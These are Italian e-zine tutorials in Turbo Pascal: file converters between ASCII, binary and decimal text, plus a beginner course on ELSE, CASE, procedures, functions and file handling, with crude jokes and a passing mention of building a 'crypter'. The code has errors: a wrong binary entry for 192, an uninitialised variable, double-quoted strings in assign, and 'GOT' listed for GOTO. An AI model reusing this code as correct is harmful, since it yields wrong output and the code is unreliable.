 |  if C=156 then D:='10011100'; if C=157 then D:='10011101';                 |
 |  if C=158 then D:='10011110'; if C=159 then D:='10011111';                 |
 |  if C=160 then D:='10100000'; if C=161 then D:='10100001';                 |
 |  if C=162 then D:='10100010'; if C=163 then D:='10100011';                 |
 |  if C=164 then D:='10100100'; if C=165 then D:='10100101';                 |
 |  if C=166 then D:='10100110'; if C=167 then D:='10100111';                 |
 |  if C=168 then D:='10101000'; if C=169 then D:='10101001';                 |
 |  if C=170 then D:='10101010'; if C=171 then D:='10101011';                 |
 |  if C=172 then D:='10101100'; if C=173 then D:='10101101';                 |
 |  if C=174 then D:='10101110'; if C=175 then D:='10101111';                 |
 |  if C=176 then D:='10110000'; if C=177 then D:='10110001';                 |
 |  if C=178 then D:='10110010'; if C=179 then D:='10110011';                 |
 |  if C=180 then D:='10110100'; if C=181 then D:='10110101';                 |
 |  if C=182 then D:='10110110'; if C=183 then D:='10110111';                 |
 |  if C=184 then D:='10111000'; if C=185 then D:='10111001';                 |
 |  if C=186 then D:='10111010'; if C=187 then D:='10111011';                 |
 |  if C=188 then D:='10111100'; if C=189 then D:='10111101';                 |
 |  if C=190 then D:='10111110'; if C=191 then D:='10111111';                 |
 |  if C=192 then D:='11000010'; if C=193 then D:='11000001';                 |
 |  if C=194 then D:='11000010'; if C=195 then D:='11000011';                 |
 |  if C=196 then D:='11000100'; if C=197 then D:='11000101';                 |
 |  if C=198 then D:='11000110'; if C=199 then D:='11000111';                 |
 |  if C=200 then D:='11001000'; if C=201 then D:='11001001';                 |
 |  if C=202 then D:='11001010'; if C=203 then D:='11001011';                 |
 |  if C=204 then D:='11001100'; if C=205 then D:='11001101';                 |
 |  if C=206 then D:='11001110'; if C=207 then D:='11001111';                 |
 |  if C=208 then D:='11010000'; if C=209 then D:='11010001';                 |
 |  if C=210 then D:='11010010'; if C=211 then D:='11010011';                 |
 |  if C=212 then D:='11010100'; if C=213 then D:='11010101';                 |
 |  if C=214 then D:='11010110'; if C=215 then D:='11010111';                 |
 |  if C=216 then D:='11011000'; if C=217 then D:='11011001';                 |
 |  if C=218 then D:='11011010'; if C=219 then D:='11011011';                 |
 |  if C=220 then D:='11011100'; if C=221 then D:='11011101';                 |
 |  if C=222 then D:='11011110'; if C=223 then D:='11011111';                 |
 |  if C=224 then D:='11100000'; if C=225 then D:='11100001';                 |
 |  if C=226 then D:='11100010'; if C=227 then D:='11100011';                 |
 |  if C=228 then D:='11100100'; if C=229 then D:='11100101';                 |
 |  if C=230 then D:='11100110'; if C=231 then D:='11100111';                 |
 |  if C=232 then D:='11101000'; if C=233 then D:='11101001';                 |
 |  if C=234 then D:='11101010'; if C=235 then D:='11101011';                 |
 |  if C=236 then D:='11101100'; if C=237 then D:='11101101';                 |
 |  if C=238 then D:='11101110'; if C=239 then D:='11101111';                 |
 |  if C=240 then D:='11110000'; if C=241 then D:='11110001';                 |
 |  if C=242 then D:='11110010'; if C=243 then D:='11110011';                 |
 |  if C=244 then D:='11110100'; if C=245 then D:='11110101';                 |
 |  if C=246 then D:='11110110'; if C=247 then D:='11110111';                 |
 |  if C=248 then D:='11111000'; if C=249 then D:='11111001';                 |
 |  if C=250 then D:='11111010'; if C=251 then D:='11111011';                 |
 |  if C=252 then D:='11111100'; if C=253 then D:='11111101';                 |
 |  if C=254 then D:='11111110'; if C=255 then D:='11111111';                 |
 |  write(B,D);                                                               |
 | end;                                                                       |
 |                                                                            |
 |close(A);                                                                   |
 |close(B);                                                                   |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |Beh, non c'è bisogno che vi spiego come funzioni :P                         |
 |questo programma l'ho scritto solo perché potrebbe essere un buon inizio per|
 |pensare a programmi di crittografia, basterebbe fare un gigantesco XOR al   |
 |file Destinazione e abbiamo il file criptato... poi potrete fare tutto ciò  |
 |che volete                                                                  |
 |                                                                            |
 |Adesso, se vogliamo rimettere tutto a posto?, semplice, creiamoci un altro  |
 |programma che cambia i numeri da binario a caratteri, una bazzecola...      |
 |almeno questo l'ho fatto "MATEMATICAMENTE PURO"                             |
 |e non un insieme di IF e contro IF                                          |
 +----------------------------------------------------------------------------+
 |{progetto Binary to Ascii}                                                  |
 |program B2F;                                                                |
 |uses crt;                                                                   |
 |const                                                                       |
 |Ele:array[0..7] of integer = (128,64,32,16,8,4,2,1);                        |
 |var                                                                         |
 |A:file of byte;                                                             |
 |B:file of byte;                                                             |
 |C:byte;                                                                     |
 |indice:integer;                                                             |
 |ARR:array[0..7] of byte;                                                    |
 |bit:array[0..7] of byte;                                                    |
 |                                                                            |
 |INPUT:STRING;                                                               |
 |OUTPUT:STRING;                                                              |
 |                                                                            |
 |begin                                                                       |
 |clrscr;                                                                     |
 |write('Inserisci il file sorgente: ');                                      |
 |readln(INPUT);                                                              |
 |write('Inserisci il file destinazione: ');                                  |
 |readln(OUTPUT);                                                             |
 |                                                                            |
 |assign(A,INPUT);                                                            |
 |assign(B,OUTPUT);                                                           |
 |reset(A);                                                                   |
 |rewrite(B);                                                                 |
 |                                                                            |
 |while not eof(A) do                                                         |
 | begin                                                                      |
 |  for indice:=0 to 7 do                                                     |
 |   begin                                                                    |
 |    read(A,ARR[indice]);                                                    |
 |    bit[indice]:=ARR[indice]-48;                                            |
 |    C:=C+(bit[indice]*ele[indice]);                                         |
 |   end;                                                                     |
 | write(B,C);                                                                |
 | C:=0;                                                                      |
 | end;                                                                       |
 |                                                                            |
 |close(A);                                                                   |
 |close(B);                                                                   |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |Capite immediatamente che con un programma del genere potete fare un ottimo |
 |crypter...                                                                  |
 |allora, iniziamo con la spiegazione del programma...                        |
 |innanzitutto quella costante chiamata ELE, so che vi è antipatica, ma è per |
 |non rallentare la velocità del TRANSFORMER perdendo tempo con tutte le      |
 |elevazioni... infatti, ho fatto prima a mettere in una costante tutte le    |
 |elevazioni del 2 fino alla settima... al contrario, perché dovevo adattarlo |
 |al ciclo for... vedremo poi...                                              |
 |                                                                            |
 |saltiamo alle variabili ARR e bit che, come vedete sono arrays... perché?   |
 |perché ciò veniva più facile... adesso vediamo...                           |
 |                                                                            |
 |arriviamo al loop, che è il SODO di tutto il programma                      |
 |traduciamo il pascal in italiano, e diventa:                                |
 |                                                                            |
 |Fai le seguenti cose finchè non arrivi alla fine del file sorgente:         |
 |Per otto volte: leggi il primo carattere che trovi nel file sorgente e      |
 |"schiaffalo" dentro la INDICE cella dell'array ARR; la INDICE cella di bit  |
 |è uguale alla INDICE cella di ARR meno 48; C vale Sè stesso più la INDICE   |
 |cella di BIT * la INDICE cella di ELE, o meglio BIT per 2^7.                |
 |finita l'ottava volta, scrivi nel file destinazione il numero C (se il file |
 |è un file of byte, trasforma direttamente il numero in CHAR) e azzera C     |
 |                                                                            |
 |Questo è il corpo del programma...                                          |
 |il meno 48, capirete che vuol dire leggendo il tutorial su come costruire un|
 |convertitore di caratteri ASCII in numeri, mentre il calcolo                |
 | C:=C+(BIT[INDICE]*ELE[INDICE]); è semplicissimo...                         |
 |se leggete il tutorial sull'assembler troverete l'algoritmo per trasformare |
 |i numeri binari in decimale...                                              |
 |quindi il calcolo sarebbe così:                                             |
 |                                                                            |
 |C:=C+(1 o 0)*2^7                                                            |
 |(io conto sempre il primo bit...)                                           |
 |                                                                            |
 |siccome su ELE ho messo le potenze del 2, potremo vedere la dichiarazione di|
 |ELE in questo modo:                                                         |
 |                                                                            |
 |CONST ELE:ARRAY[0..7] OF INTEGER = (2^7, 2^6, 2^5, 2^4, 2^3, 2^2, 2^1, 2^0);|
 |                                                                            |
 |e quindi, il calcolo diventa:                                               |
 |                                                                            |
 |C:=C+(1 o 0)*ELE[INDICE];                                                   |
 |                                                                            |
 |adesso troviamo quell'1 o 0...                                              |
 |siccome abbiamo dato a BIT 7 celle, e abbiamo detto che BIT[INDICE] vale    |
 |ARR[INDICE]-48, allora se ARR[INDICE] vale o '1' o '0', che in ascii sono   |
 |rispettivamente 48 e 49, se diminuiamo per 48 otteniamo il numero preciso   |
 |non in caratteri ascii                                                      |
 |diventa                                                                     |
 |                                                                            |
 |C:=C+BIT[INDICE]*ELE[INDICE];                                               |
 |                                                                            |
 |potremmo anche fare così:                                                   |
 |                                                                            |
 |C:=C+(ARR[INDICE]-48)*ELE[INDICE]                                           |
 |                                                                            |
 |è esattamente la stessa cosa...                                             |
 |quindi, otteniamo l'algoritmo che converte i numeri binari in ASCII...      |
 |tutto molto semplice                                                        |
 |                                                                            |
 |Bien, this is all punks                                                     |
 |                                                                            |
 |Byezz                                                                       |
 |                                                                            |
 |KoRnuto (o meglio Eimiar)                                                   |
 +----------------------------------------------------------------------------+



+--[PROGRAMMAZIONE]------------------------------------------------------[IL04]+
|  Titolo: Converter AScii2Number in Turbo pascal                              |
|  Autore: Eimiar                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
 +----------------------------------------------------------------------------+
 |P.S. pre scrittum                                                           |
 |KoRnuto cambia nick, d'ora in poi sarà Eimiar                               |
 |                                                                            |
 | KORNUTO - 7H3 N4M3 WR073 0N 7H3 5M0K3                                      |
 | ...PrEsEnTs...                                                             |
 |                                                                            |
 |6666666666666666666666666666666666666666666666666666666666666666666666666666|
 |66699966 CREIAMO UN CONVERTITORE DI ASCII IN NUMERI IN TURBO PASCAL 66699966|
 |9999999999999999999999999999999999999999999999999999999999999999999999999999|
 |                                                                            |
 |                   /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\                   |
 |                   |  /¯\                               |                   |
 |                   | / | \      ATTENZIONE!!!!          |                   |
 |                   |/  o  \                             |                   |
 |                   |¯¯¯¯¯¯¯                             |                   |
 |                   | IL SISTEMA HA RILEVATO LA PRESENZA |                   |
 |                   |           DI ALLEGATI!             |                   |
 |                   |         __________________         |                   |
 |                   |        /                  \        |                   |
 |                   |        |        OK        |        |                   |
 |                   |        \__________________/        |                   |
 |                   \____________________________________/                   |
 |Allegati:                                                                   |
 | - AtoN.exe                                                                 |
 | - NtoA.exe                                                                 |
 | - Sorgente.gif                                                             |
 |                                                                            |
 | INTRODUCTION! (è inglish, ma è più figo)                                   |
 |Oggi girando per internet ho letto che più ti spari forte le pippe e più    |
 |spari lontano...                                                            |
 |                                                                            |
 |                                    O_O                                     |
 |                                                                            |
 |Bhe, lasciamo perdere gli sbloccatori di mente arguta (???)                 |
 |E vi dico, che se adesso scrivo questo tutorial, è solo grazie a HACKHERTZ  |
 |quindi, prima di cominciare, dedico la più mitica frase che un uomo possa   |
 |pensare...                                                                  |
 |                                                                            |
 |                          GRAZIE HACKHERTZ!!!!!!!!!                         |
 |                                                                            |
 |Bene, cominciamo, siccome io questo tutorial lo scrivo per spiegarvi questo |
 |progetto che ho ideato, allora spero che vi studiate bene bene il progetto  |
 |che in realtà non è niente di poi così tanto difficile                      |
 |In realtà, è semplicemente un programma che cambia i singoli caratteri ASCII|
 |di un file e li scrive in un altro file sotto forma del suo corrispondente  |
 |numerico...                                                                 |
 |                                                                            |
 |Example!                                                                    |
 |A=65 - B=66 - C=67... però! dentro un file...                               |
 |                                                                            |
 |qui vi copio il progetto, poi vi spiego istruzione per istruzione           |
 |                                                                            |
 +----------------------------------------------------------------------------+
 |{progetto AtoN}                                                             |
 |program AtoN;                                                               |
 |uses dos,crt;                                                               |
 |                                                                            |
 |var a:file of byte;                                                         |
 |    b:text;                                                                 |
 |    c:byte;                                                                 |
 |    Input:string;                                                           |
 |    Output:string;                                                          |
 |                                                                            |
 |Begin                                                                       |
 |clrscr;
 |write('Inserisci il file sorgente: ');                                      |
 |readln(Input);                                                              |
 |write('Inserisci il file destinazione: ');                                  |
 |readln(Output);                                                             |
 |assign(a,Input);                                                            |
 |assign(b,Output);                                                           |
 |reset(a);                                                                   |
 |rewrite(b);                                                                 |
 |while not eof(a) do                                                         |
 | begin                                                                      |
 |  read(a,c);                                                                |
 |  write(b,c,' ');                                                           |
 | end;                                                                       |
 |close(a);                                                                   |
 |close(b);                                                                   |
 |End.                                                                        |
 +----------------------------------------------------------------------------+
 |se lo fate partire capirete il risultato                                    |
 |allora, saltiamo tutto fino a rewrite(b) che credo che sappiate cosa vuol   |
 |dire... (se no leggetevi la terza parte del tutorial sul turbo pascal)      |
 |e guardiamo il ciclo, che è la parte gialla dell'uovo...                    |
 |                                                                            |
 |finchè non arrivi alla fine del file, leggi il primo carattere nel file     |
 |sorgente e "schiaffalo" in C; scrivi questo numero con uno spazio nel file  |
 |destinazione...                                                             |
 |                                                                            |
 |Questo è il tuorlo del progetto...                                          |
 |                                                                            |
 |se invece volessimo fare il progetto che fa il contrario?                   |
 |cioè che prende il numero e lo fa diventare ASCII in un file destinazione?  |
 |e anche qua, è semplice...                                                  |
 |                                                                            |
 +----------------------------------------------------------------------------+
 |{progetto NtoA}                                                             |
 |program NtoA;                                                               |
 |uses dos,crt;                                                               |
 |var a:file of byte;                                                         |
 |    b:file of byte;                                                         |
 |    c:byte;                                                                 |
 |    d:byte;                                                                 |
 |    Input:string;                                                           |
 |    Output:string;                                                          |
 |                                                                            |
 |Begin                                                                       |
 |clrscr;                                                                     |
 |write('Inserisci il file sorgente: ');                                      |
 |readln(Input);                                                              |
 |write('Inserisci il file destinazione: ');                                  |
 |readln(Output);                                                             |
 |assign(a,Input);                                                            |
 |assign(b,Output);                                                           |
 |reset(a);                                                                   |
 |rewrite(b);                                                                 |
 |while not eof(a) do                                                         |
 | begin                                                                      |
 |  read(a,c);                                                                |
 |                                                                            |
 |  if (c=32) then                                                            |
 |   BEGIN                                                                    |
 |    write(b,d);                                                             |
 |    d:=(0);                                                                 |
 |   END                                                                      |
 |   ELSE                                                                     |
 |   BEGIN                                                                    |
 |    d:=(d*10+c-48);                                                         |
 |   END;                                                                     |
 |                                                                            |
 | end;                                                                       |
 |close(a);                                                                   |
 |close(b);                                                                   |
 |End.                                                                        |
 +----------------------------------------------------------------------------+
 |anke qui, lasciamo perdere tutta la pappardella fino a rewrite(b) e iniziamo|
 |col sodo (il ciclo)                                                         |
 |                                                                            |
 |finchè non arrivi alla fine del file, leggi il primo carattere nel file     |
 |sorgente e "schiaffalo" in C; se C è uno spazio, allora scrivi nel file     |
 |destinazione D e azzera D; altrimenti D è uguale a D*10+C-48                |
 |                                                                            |
 |ecco qua il codice...                                                       |
 |vi chiederete PERCHÉ D:=D*10+C-48 ?????                                     |
 |e io vi risponderò SEMPLICE!                                                |
 |                                                                            |
 |provate a prendere un file che inizia con la lettera B maiuscola            |
 |la B maiuscola in Ascii è 66 no?                                            |
 |quindi nel file destinazione scriverà 66 come primo numero...               |
 |ora, se vogliamo cambiare quel 66 in ascii, proviamo a fare il seguente     |
 |calcolo (6 in ascii vale 54)                                                |
 |D:=0*10+54-48                                                               |
 |quindi D:= 54-48                                                            |
 |che fa 6!                                                                   |
 |D=6                                                                         |
 |poi, il secondo numero è di nuovo 6, quindi di nuovo                        |
 |D:=6*10+54-48                                                               |
 |quindi D:= 60+6                                                             |
 |che fa 66 !!!                                                               |
 |D=66                                                                        |
 |                                                                            |
 |v'as capì?                                                                  |
 |è tutto molto semplice...                                                   |
 |                                                                            |
 |Bien, this is all punks                                                     |
 |                                                                            |
 |Byezz                                                                       |
 |                                                                            |
 |KoRnuto (o meglio Eimiar)                                                   |
 +----------------------------------------------------------------------------+



+--[PROGRAMMAZIONE]------------------------------------------------------[IL04]+
|  Titolo: Corso Turbo pascal 3° parte                                         |
|  Autore: Eimiar                                                              |
|  Lingua: Italiano                                                            |
|  E-zine: Informazionelibera                                                  |
+------------------------------------------------------------------------------+
 +----------------------------------------------------------------------------+
 |P.S. pre scrittum                                                           |
 |KoRnuto cambia nick, d'ora in poi sarà Eimiar                               |
 |                                                                            |
 | KORNUTO - 7H3 N4M3 WR073 0N 7H3 5M0K3                                      |
 | ...PrEsEnTs...                                                             |
 |                                                                            |
 |                                                                            |
 |                   /¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯\                   |
 |                   |  /¯\                               |                   |
 |                   | / | \      ATTENZIONE!!!!          |                   |
 |                   |/  o  \                             |                   |
 |                   |¯¯¯¯¯¯¯                             |                   |
 |                   | IL SISTEMA HA RILEVATO LA PRESENZA |                   |
 |                   |           DI ALLEGATI!             |                   |
 |                   |         __________________         |                   |
 |                   |        /                  \        |                   |
 |                   |        |        OK        |        |                   |
 |                   |        \__________________/        |                   |
 |                   \____________________________________/                   |
 |Allegati:                                                                   |
 | - Dos.txt                                                                  |
 |                                                                            |
 |- INTRODUZIONE - INTRODUZIONE - INTRODUZIONE - INTRODUZIONE - INTRODUZIONE -|
 |OgGi Ho CoNoScIuTo La PrOf Di ReLiGiOnE... MIIIIINCHIA CHE FIIIIIGA!!!!!    |
 |Giusto per stare in tema... la mia tipa non mi ha più mollato...            |
 |L'HO MOLLATA IO!!!!! E NE VADO PIU' CHE FIERISSIMO!!!! SIIIIIII'            |
 |il problema è che adesso me ne devo cercare un'altra più figa...            |
 |altrimenti i miei amici mi sputeranno in tutti e due gli occhi              |
 |                                                                            |
 |                                                                            |
 |Rieccovi finalmente qui alla lezione di Turbo Pascal (3° Parte) Siete dei   |
 |miti, non credevo che continuavate a studiarvelo!!! e io che credevo che non|
 |v'interessasse!!!                                                           |
 |                                                                            |
 |mi sono arrivate centinaia di e-mail che dicevano:                          |
 |                                                                            |
 | > KORNUTO!!!                                                               |
 | > SEI UN IDOLO!!!                                                          |
 | > TI ADORIAMO, SEI UN GENIO DEL TURBO PASCAL!!!                            |
 | > DEVI CONTINUARE COL TUO TUTORIAL, NE VA PER L'IMPORTANZA DI INFORMAZIONE |
 | > LIBERA!!!                                                                |
 | > CONTINUA COSì!!!                                                         |
 |                                                                            |
 |Anche se sinceramente io non ho mai dato a nessuno il mio indirizzo e-mail  |
 |                                                                            |
 |BUAHAHAHAHAHAHAHA ci stavate cascando eh???                                 |
 |ah, ma sapete che... (BASTA!!!!!)                                           |
 |                                                                            |
 |okkei, basta fare i collioni e facciamo i seri, che vi vedo che state       |
 |andando in fibrillazione                                                    |
 |                                                                            |
 |ok, in questa lezione vi spiegherò:                                         |
 |                  ELSE (mi sono dimenticato di spiegarvele nel #2)          |
 |                  CASE ... OF (anche questo, ciò è grave...)                |
 |                  le parole riservate                                       |
 |                  le Procedure e le Funzioni (che , a differenza di molti   |
 |        linguaggi di programmazione come il C++ NON SONO UGUALI...)         |
 |                  l'uso di Turbo Pascal sui files                           |
 |                  nuove funzioni e procedure appartenenti alla libreria CRT |
 |                  nuove funzioni e procedure appartenenti alla libreria DOS |
 |                                                                            |
 |credo sia meglio fermarci qui, se no diventerà troppo lungo il tutorial     |
 |                                                                            |
 |Prima di iniziare, vi spiego due cosette:                                   |
 |vedrete che nei progetti e nelle dichiarazioni delle funzioni o costanti, o |
 |procedure... eccetera, i nomi saranno in maiuscolo (o con alcune lettere    |
 |maiuscole) tutto questo per farvi capire in Inglese quando inizia una parola|
 |e quando inizia l'altra...                                                  |
 |ad esempio GetFAttr (vedrete poi)                                           |
 |la posso scrivere nel compilatore come la voglio...                         |
 |questo per dirvi che il Turbo Pascal NON È CASE SENSITIVE (mi pare di non   |
 |averlo detto nei numeri prima... È GRAVE!!!                                 |
 |                                                                            |
 |poi, un'altra cosa:                                                         |
 |in alcune funzioni o procedure si vedrà che dirò I BYTE SUPERIORI, o I BYTE |
 |INFERIORI in questo caso, si vede che tratterò di Word, (word inteso il     |
 |tipo, non la parola, DEF!) per vedere i byte inferiori, basterà usare la    |
 |funzione Lo(_var_); per vedere i byte superiori basterà usare la funzione   |
 |Hi(_var_);                                                                  |
 |                                                                            |
 |V'AS CAPIT?                                                                 |
 |ok cominciamo                                                               |
 |                                                                            |
 |                                                                            |
 |ELSE                                                                        |
 |bene, cominciamo con l'argomento PIU' semplice del tutorial, ho dimenticato |
 |di inserirlo nel numero scorso... tutto ciò è grave... perché gli ELSE sono |
 |strettamente legati agli IF...                                              |
 |perdonatemi                                                                 |
 |riprendiamo una vecchia istruzione IF                                       |
 |                                                                            |
 |IF (condizione) THEN (Blocco o istruzione)                                  |
 |                                                                            |
 |Example!                                                                    |
 +----------------------------------------------------------------------------+
 |{Progetto IF-ELSE}                                                          |
 |uses crt;                                                                   |
 |var nome:string;                                                            |
 |                                                                            |
 |begin                                                                       |
 |clrscr;                                                                     |
 |IF (nome='Giovanni') or (nome='giovanni') then writeln ('Bravo! hai il nome |
 |    uguale al mio!') {NOTATE CHE NON C'È IL ';'}                            |
 |ELSE writeln('Non hai il nome uguale al mio, vergognati!!!');               |
 |readkey;                                                                    |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |in poche parole, tradotto questo diventa:                                   |
 | SE nome='Giovanni' ALLORA SCRIVI blablabla                                 |
 | ALTRIMENTI SCRIVI blebleble;                                               |
 |                                                                            |
 |quel readkey, lo saprete continuando a leggere la guida cos'è...            |
 |                                                                            |
 |                                                                            |
 |CASE ... OF                                                                 |
 |Questa istruzione, (per chi sa il C) è uguale agli SWITCH                   |
 |la sua sintassi è                                                           |
 |                                                                            |
 |CASE _var_ OF                                                               |
 |_valore1_:begin                                                             |
 |           istruzioni;                                                      |
 |          end;                                                              |
 |_valoreN_:begin                                                             |
 |           istruzioni;                                                      |
 |          end;                                                              |
 |END;                                                                        |
 |                                                                            |
 |invece chi non ha mai programmato in vita sua, sappia che il CASE ... OF    |
 |è esattamente la stessa cosa dell'IF, solo un po' diversa...                |
 |vediamo come                                                                |
 |I seguenti progetti sono uguali                                             |
 +----------------------------------------------------------------------------+
 |{progetto IF}                                                               |
 |uses crt;                                                                   |
 |var n:integer;                                                              |
 |begin                                                                       |
 |clrscr;                                                                     |
 |writeln('Scrivi un numero da 1 a 5');                                       |
 |readln(n);
 |IF n = 1 THEN writeln('numero 1');                                          |
 |IF n = 2 THEN writeln('numero 2');                                          |
 |IF n = 3 THEN writeln('numero 3');                                          |
 |IF n = 4 THEN writeln('numero 4');                                          |
 |IF n = 5 THEN writeln('numero 5');                                          |
 |readkey;                                                                    |
 |end.                                                                        |
 +-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=+
 |{progetto CASE ... OF}                                                      |
 |uses crt;                                                                   |
 |var n:integer;                                                              |
 |begin                                                                       |
 |clrscr;                                                                     |
 |writeln('Scrivi un numero da 1 a 5');                                       |
 |readln(n);                                                                  |
 |CASE n OF                                                                   |
 |1:writeln('numero 1');                                                      |
 |2:writeln('numero 2');                                                      |
 |3:writeln('numero 3');                                                      |
 |4:writeln('numero 4');                                                      |
 |5:writeln('numero 5');                                                      |
 |END;                                                                        |
 |readkey;                                                                    |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |i due progetti, sono completamente uguali (in senso di EXE)                 |
 |                                                                            |
 |LE PAROLE RISERVATE                                                         |
 |                                                                            |
 |per fare alcuni programmi, ciò che ASSOLUTAMENTE non dovete fare, è dare a  |
 |un identificatore come nome una delle parole riservate, che sono le parole  |
 | che il compilatore usa per fare diverse cose                               |
 |                                                                            |
 |per chi non lo sapesse, un identificatore può essere:                       |
 |    una variabile                                                           |
 |    una costante                                                            |
 |    una procedura                                                           |
 |    una funzione                                                            |
 |    un tipo                                                                 |
 |    ...                                                                     |
 |                                                                            |
 |le parole riservate sono le seguenti separate da uno spazio                 |
 +----------------------------------------------------------------------------+
 |AND ASM ARRAY BEGIN CASE CONST CONSTRUCTOR DESTRUCTOR DIV DO DOWNTO ELSE END|
 |EXPORTS FILE FOR FUNCTION GOT IF IMPLEMENTATION IN INHERITED INLINE         |
 |INTERFACE LABEL LIBRARY MOD NIL NOT OBJECT OF OR PACKED PROCEDURE PROGRAM   |
 |RECORD REPEAT SET SHL SHR STRING THEN TO TYPE UNIT                          |
 |UNTIL USES VAR WHILE WITH XOR                                               |
 +----------------------------------------------------------------------------+
 |                                                                            |
 |sono un bel po' eh?                                                         |
 |                                                                            |
 |LE PROCEDURE E LE FUNZIONI                                                  |
 |                                                                            |
 |In Turbo Pascal, le procedure e le funzioni sono diverse, anzi, io potrei   |
 |dire che sono                                                               |
 |simili, ma non sono per niente uguali, se non per la dichiarazione          |
 |                                                                            |
 |diciamo un po'                                                              |
 |avete presente le funzioni del C ?                                          |
 |le funzioni del C usano INT, CHAR, DOUBLE, FLOAT O VOID                     |
 |ex.                                                                         |
 |                                                                            |
 |int func(int a, int b){ return a+b }                                        |
 |                                                                            |
 |questa è una funzione che ritorna la somma di a e b                         |
 |ma è completamente diversa con le funzioni di tipo VOID!                    |
 |                                                                            |
 |e qui troviamo la differenza...                                             |
 |                                                                            |
 |in poche parole, le procedure in pascal sono uguali alle funzioni VOID del C|
 |mentre le altre funzioni INT, DOUBLE, FLOAT, CHAR... sono uguali alle       |
 |funzioni del pascal                                                         |
 |                                                                            |
 |quindi cominciamo prima con le procedure                                    |
 |                                                                            |
 |LE PROCEDURE                                                                |
 |                                                                            |
 |in turbo pascal, la dichiarazione di una procedura si fa così:              |
 |                                                                            |
 |PROCEDURE nome( parametri (* opzionale *) );                                |
 |BEGIN                                                                       |
 |istruzioni...                                                               |
 |END;                                                                        |
 |                                                                            |
 |quindi, un esempio può essere così                                          |
 |                                                                            |
 |PROCEDURE alfanum;                                                          |
 |BEGIN                                                                       |
 |writeln('ABCDEFGHIJKLMNOPQRSTUVWXYZ');                                      |
 |writeln('abcdefghijklmnopqrstuvwxyz');                                      |
 |writeln('0123456789');                                                      |
 |END;                                                                        |
 |                                                                            |
 |quindi, nel bel mezzo del programma, se scriverete alfanum, il compilatore  |
 |ritornerà alla dichiarazione della procedura ed eseguirà ciò che è contenuto|
 |tra il BEGIN e l'END;                                                       |
 |                                                                            |
 |N.B. l'End è con il punto è virgola, e la procedura dev'essere dichiarata   |
 |PRIMA del blocco programma ma dopo le variabili.                            |
 |                                                                            |
 |facciamo un altro esempio di procedura ma stavolta con i parametri          |
 |                                                                            |
 |VAR a:string;                                                               |
 |PROCEDURE ins(c:string;d:char);                                             |
 |BEGIN                                                                       |
 |a:=c+d;                                                                     |
 |END;                                                                        |
 |                                                                            |
 |ecco qua, non è molto difficile, si dichiarano le variabili una stringa e   |
 |una char, si dichiara la procedura 'ins' e si dice di aggiungere il char    |
 |nella parte finale della stringa.                                           |
 |                                                                            |
 |poi, nel blocco programma, quando scriverete 'ins(a,b)' il compilatore      |
 |tornerà alla procedura e aggiungerà nella parte finale di a (o qualunque    |
 |variabile inserite, però, se cambiate la variabile, dovrete cambiare anche  |
 |l'istruzione 'a:=c+d') la variabile b                                       |
 |                                                                            |
 |capit?                                                                      |
 |                                                                            |
 |LE FUNZIONI                                                                 |
 |le funzioni, nella dichiarazione, sono simili alle procedure, e mentre      |
 |nell'uso nel blocco                                                         |
 |programma, sono uguali alle procedure.                                      |
 |                                                                            |
 |la dichiarazione è così                                                     |
 |                                                                            |
 |FUNCTION nome ( parametri (* opzionali *) ) : tipo ;                        |
 |                                                                            |
 |qui il discorso è sempre lo stesso delle procedure                          |
 |ora, un veloce esempio per le somme                                         |
 |                                                                            |
 |VAR somma:integer;                                                          |
 |FUNCTION plus(c:integer;d:integer):integer;                                 |
 |BEGIN                                                                       |
 |plus:=c+d;                                                                  |
 |END;                                                                        |
 |                                                                            |
 |il tipo dev'essere presente per comportare il risultato della somma, se era |
 |una somma tra integer e integer, non poteva essere byte il tipo, perché     |
 |verrebbe errore solo se il risultato superasse un certo limite...           |
 |                                                                            |
 |                                                                            |
 |L'USO DI TURBO PASCAL SUI FILES                                             |
 |                                                                            |
 |E qui arriviamo su un argomento più interessante, perché in quasi tutti i   |
 |linguaggi di programmazione, (secondo me) il trattamento dei files è        |
 |l'argomento più usato...                                                    |
 |                                                                            |
 |cominciamo col vedere che forma ha il dichiaratore dei files in TP          |
 |                                                                            |
 |var  _nome_ : file of _tipo_ ;                                              |
 |                                                                            |
 |example... (è inglish, ma è + figo!)                                        |
 |                                                                            |
 |var ax:file of char;                                                        |
 |                                                                            |
 |naturalmente, voi potete scegliere il tipo... anche se sconsiglio altamente |
 |di utilizzare integer,smallint,longint e real... perché occuperebbe troppi  |
 |bytes, e tanto si sa che un byte non supera il numero 255, quindi non serve |
 |a niente nè prendere numeri decimali, nè prendere numeri troppo grossi.     |
 |                                                                            |
 |ok, abbiamo dichiarato il file, però ora che si fa?                         |
 |innanzitutto bisogna assegnare il file, e questo si fa col comando ASSIGN   |
 |la sua forma è così:                                                        |
 |                                                                            |
 |assign(_file_,"_indirizzo_");                                               |
 |                                                                            |
 |example...                                                                  |
 |                                                                            |
 |assign(ax,"c:\autoexec.bat");                                               |
 |                                                                            |
 |oppure                                                                      |
 |                                                                            |
 |assign(ax,"autoexec.bat");                                                  |
 |                                                                            |
 |qual è la differenza fra i due esempi?                                      |
 |sembra poca, ma in realtà sono cose completamente diverse...                |
 |non ci sarebbe differenza se il file eseguibile si trovasse nella stessa    |
 |path di autoexec.bat                                                        |
 |                                                                            |
 |quindi la differenza è:                                                     |
 |il primo esempio va a seguire l'intero indirizzo del file (chiaramente non  |
 |si può assegnare un file a una directory!!!).                               |
 |                                                                            |
 |il secondo esempio va a seguire il file autoexec.bat che si trova nella     |
 |stessa cartella del file eseguibile.                                        |
 |                                                                            |
 |ricordatevi che per quanto riguarda l'indirizzo che date nel secondo spazio |
 |dell'assign, può anche essere inesistente, ma il compilatore non darà errori|
 |perché con TP si possono sia aprire che creare i files (MA NO!!!) l'errore  |
 |verrà quando cercherete di aprirlo il file...                               |
 |                                                                            |
